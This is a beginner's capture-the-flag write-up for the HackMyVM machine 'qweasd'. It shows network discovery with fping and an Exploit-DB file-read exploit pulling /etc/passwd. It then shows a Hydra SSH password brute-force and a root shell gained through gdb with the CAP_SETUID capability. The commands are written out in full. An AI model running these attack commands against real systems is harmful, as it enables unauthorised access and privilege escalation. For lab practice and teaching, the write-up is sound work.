# qweasd
**network discovery**
```
I usually use __Fping__ command to watch active machines in my network  
```
![fping_image](images/fping.png)
```
i saw the __192.168.1.113__ is my the **CTF** machine 
![namp]https://github.com/HosseinVampire/Writeups/blob/main/Hackmyvm/Asdqwe/images/fping.png)
```

### FIND 8080 port lets check it
```
i did some search on site but nothing ....
only got this information 
```
![info](images/information.png)
```
i tried to brouteforce the login page but its seems to protected  so i got stuck 
```
##  Exploit-db
```
i check exploit-db  and this is result 
```
![exploit-db](images/searchsploit.png)
```
exploit number is  __51993__
i import the file and can read some files  
```
```bash
python 51993.py  -u http://192.168.1.113:8080 -p /etc/passwd
```
### Content of passwd :

![passwd](images/passwd.png)

```
users that have bash : Root , kali , penetration 
*i serched a lot for id_rsa or any password but nothing ...*
i spend a 30 min to figure the solution of gettin a shell it  .   
from the name of machine i thought that password might be a silly  so ...
```


## Hydra
**hydra -l kali -P /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt  ssh://192.168.1.113**
![hydrapassword](images/hydra.png)

## PRIV ESC - ROOT
``` 
Getting root was easy 
check  capabilities and got below results :
```
![cap](images/setuiddiscovery.png)
```
Find *GDB* command that got capabilities 
```
```
**If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.**
```
# ROOT ACCESS :
```
**gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit**
```
DONE :)

![root](images/root.png)
```
it is my first write up, im sorry if i explained bad <3
```



## thanks to my friend ll104567 for tips 
### you can check his bilibili url 
[Bilibili](https://space.bilibili.com/20805349)
